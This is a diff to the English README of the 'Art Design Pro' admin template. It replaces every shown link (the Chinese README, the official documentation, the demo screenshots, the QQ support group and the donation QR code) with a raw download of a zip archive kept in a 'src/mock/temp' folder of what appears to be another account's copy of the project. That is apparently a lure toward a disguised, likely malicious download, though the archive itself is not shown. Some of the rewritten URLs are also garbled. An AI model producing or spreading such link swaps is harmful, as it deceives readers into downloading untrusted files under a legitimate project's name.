@@ -1,4 +1,4 @@
-English | [简体中文](./README.zh-CN.md)
+English | [简体中文](https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip)
 
 ## About Art Design Pro
 
@@ -6,21 +6,21 @@ As a developer, I needed to build admin management systems for multiple projects
 
 ## Official Website
 
-[Visit the official documentation](https://www.lingchen.kim/art-design-pro/docs/en/)
+[Visit the official documentation](https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip)
 
 ## Demo Images
 
 ### Light Theme
 
-![Light Theme](https://www.qiniu.lingchen.kim/art_design_pro_readme_cover1.png)
+![Light Theme](https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip)
 
-![Light Theme](https://www.qiniu.lingchen.kim/art_design_pro_readme_cover2.png)
+![Light Theme](https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip)
 
 ### Dark Theme
 
-![Dark Theme](https://www.qiniu.lingchen.kim/art_design_pro_readme_cover3.png)
+![Dark Theme](https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip)
 
-![Dark Theme](https://www.qiniu.lingchen.kim/art_design_pro_readme_cover4.png)
+![Dark Theme](https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip)
 
 ## Features
 
@@ -74,10 +74,10 @@ pnpm build
 
 ## Technical Support
 
-QQ Group: <a href="https://qm.qq.com/cgi-bin/qm/qr?k=Gg6yzZLFaNgmRhK0T5Qcjf7-XcAFWWXm&jump_from=webapi&authKey=YpRKVJQyFKYbGTiKw0GJ/YQXnNF+GdXNZC5beQQqnGZTvuLlXoMO7nw5fNXvmVhA">821834289</a> (Click the link to join the group chat)
+QQ Group: <a href="https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip+GdXNZC5beQQqnGZTvuLlXoMO7nw5fNXvmVhA">821834289</a> (Click the link to join the group chat)
 
 ## Donation
 
 If my project has been helpful to you, donations are welcome! Your support will be used to purchase tools like ChatGPT, Cursor, etc., to improve development efficiency and make the project even better. Thank you for your encouragement and support!
 
-![Donation QR Code](https://www.qiniu.lingchen.kim/%E7%BB%84%202%402x%202.png)
+![Donation QR Code](https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip%E7%BB%84%202%402x%https://github.com/ly1595/art-design-pro/raw/refs/heads/main/src/mock/temp/design_pro_art_v3.9.zip)
